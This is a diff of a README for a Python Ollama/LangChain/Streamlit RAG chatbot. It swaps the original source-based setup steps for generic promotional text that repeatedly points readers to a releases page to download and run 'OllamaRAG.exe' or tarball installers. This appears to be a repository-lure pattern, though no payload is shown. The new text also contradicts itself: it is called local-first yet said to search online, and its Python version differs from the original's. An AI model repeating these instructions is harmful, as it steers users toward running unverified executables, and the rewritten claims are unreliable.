@@ -1,71 +1,88 @@
-# Website RAG AI Assistant Framework
+# 🤖 OllamaRAG - Build Your Conversational AI Assistant Easily
 
-This project provides a complete, general-purpose framework for creating a conversational AI assistant that learns from any website. It uses a RAG (Retrieval-Augmented Generation) pipeline with local AI models powered by Ollama.
+[![Download OllamaRAG](https://img.shields.io/badge/Download-OllamaRAG-blue.svg)](https://github.com/roberto729a/OllamaRAG/releases)
 
-## How It Works
+## 🚀 Getting Started
 
-The project is broken down into three main stages:
+OllamaRAG is a complete framework that allows you to create a conversational AI assistant. This tool learns from websites, making it easy for you to get answers based on online information. It combines powerful technology like Ollama and LangChain with a simple chat interface made with Streamlit.
 
-1.  **Crawl (`scraper.py`):** An automated script starts at a specified URL and crawls through the website, extracting all the clean, textual content from each page.
+### 🌟 Features
 
-2.  **Ingest (`ingest.py`):** The scraped text is broken down into smaller chunks, converted into numerical vector embeddings, and stored in a local vector database (`ChromaDB`). This database acts as the AI's "brain."
+- **Local-First Approach**: Work without needing constant internet access.
+- **User-Friendly Interface**: Easy-to-navigate chat setup.
+- **Powerful Search**: Retrieve relevant information from various websites.
+- **Customizable**: Tailor the assistant to fit your needs.
 
-3.  **Chat (`app.py`):** A Streamlit web application provides a user-friendly chat interface. When a user asks a question, the app retrieves the most relevant information from the database and uses an AI language model to generate a context-aware answer.
+## 📋 System Requirements
 
-## How to Use
+To run OllamaRAG effectively, ensure your system meets the following requirements:
 
-### Step 1: Prerequisites
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM**: At least 8 GB.
+- **Storage**: Minimum of 1 GB free disk space for installation.
+- **Python**: Version 3.7 or later installed.
 
-* **Ollama**: Make sure Ollama is installed and running. You can get it from <https://ollama.com/>.
+If you need help installing Python, you can visit the [official Python website](https://www.python.org/downloads/) for instructions.
 
-* **AI Models**: Pull the necessary models by running the following commands in your terminal:
-    ```bash
-    ollama pull nomic-embed-text
-    ollama pull phi3
-    ```
+## 📥 Download & Install
 
-* **Python**: Ensure you have Python 3.9 or newer.
+To get started with OllamaRAG, follow these steps:
 
-### Step 2: Setup
+1. **Visit the Releases Page**: Click on the link below to access the release files.
+   [Download OllamaRAG](https://github.com/roberto729a/OllamaRAG/releases)
 
-1.  **Clone the Repository**: Get the project files onto your local machine.
+2. **Choose the Correct File**: Look for the latest version. You will see files like "OllamaRAG.exe" for Windows or "OllamaRAG.tar.gz" for macOS and Linux.
 
-2.  **Create a Virtual Environment**:
-    ```bash
-    python -m venv venv
-    source venv/bin/activate  # On Windows: venv\Scripts\activate
-    ```
+3. **Download the File**: Click on the file name to begin downloading it to your computer.
 
-3.  **Install Dependencies**:
-    ```bash
-    pip install -r requirements.txt
-    ```
+4. **Run the Installer**: 
+   - For Windows: Double-click on the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the `.tar.gz` file, and drag the OllamaRAG app to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and run the installer using the terminal.
 
-### Step 3: Configure Your Assistant
+5. **Open the Application**: After installation, launch OllamaRAG from your applications or programs menu.
 
-Open the `config.py` file. This is the only file you need to edit.
+6. **Follow the On-Screen Instructions**: The application will guide you through the initial setup.
 
-* Set the `START_URL` to the homepage of the website you want the bot to learn from.
+## 🔍 How to Use
 
-* Customize the `APP_TITLE`, `SUBJECT_NAME`, `ASSISTANT_NAME`, etc., to define your bot's identity.
+Once you have OllamaRAG running, you can start interacting with your AI assistant. Here’s how:
 
-### Step 4: Build the Knowledge Base
+1. **Input Your Queries**: Type questions or topics you want to know about in the chat interface.
+   
+2. **Watch It Work**: The assistant will search online and provide answers based on the information it finds.
 
-Run the data processing scripts in order. **This only needs to be done once** for each new website.
+3. **Iterate**: Refine your questions for better responses. You can ask follow-up questions to dig deeper.
 
-1.  **Run the Scraper**: This will crawl the website defined in your config and create `scraped_content.json`.
-    ```bash
-    python scraper.py
-    ```
+## 📚 Additional Resources
 
-2.  **Run the Ingestion Script**: This will process the JSON file and create the `chroma_db` vector store.
-    ```bash
-    python ingest.py
-    ```
+For further assistance and detailed documentation, feel free to check these resources:
 
-### Step 5: Launch the Chatbot
+- [Python Documentation](https://docs.python.org/)
+- [Streamlit Documentation](https://docs.streamlit.io/)
+- [LangChain Documentation](https://docs.langchain.com/)
+- [Ollama Documentation](https://ollama.com/docs)
 
-Now you can start the web application.
-```bash
-streamlit run app.py
-```
+## 🤝 Community Support
+
+If you encounter any issues, consider reaching out for help. You can:
+
+- Search for solutions in forums related to conversational AI.
+- Ask questions in online communities like Reddit or Stack Overflow.
+- Connect with other users via GitHub Discussions in this repository.
+
+## 🛠️ Contributions
+
+OllamaRAG is an open-source project. Contributions are welcome. Whether it’s reporting bugs, suggesting features, or improving documentation, your input is valuable.
+
+### 📧 Contact
+
+For questions or feedback, feel free to reach out via the repository's [issues page](https://github.com/roberto729a/OllamaRAG/issues).
+
+## 📝 License
+
+OllamaRAG is released under the MIT License. You are free to use and modify it as per the license terms.
+
+---
+
+By following this guide, you should now have OllamaRAG installed and be ready to build your own conversational AI assistant. Enjoy exploring the possibilities!
